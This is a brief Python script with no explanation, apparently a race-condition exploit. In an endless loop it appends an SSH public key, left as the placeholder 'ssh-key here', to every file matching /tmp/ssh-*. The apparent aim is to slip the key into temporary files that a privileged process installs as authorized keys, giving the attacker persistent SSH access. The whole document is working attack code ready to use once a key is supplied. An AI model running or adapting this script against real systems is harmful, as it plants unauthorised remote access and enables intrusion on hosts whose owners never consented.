#!/usr/bin/python3

import glob

payload = "ssh-key here"

while True:
    keys = glob.glob("/tmp/ssh-*")
    for key in keys:
        with open(key, "a") as f:
            f.write(payload + "\n")
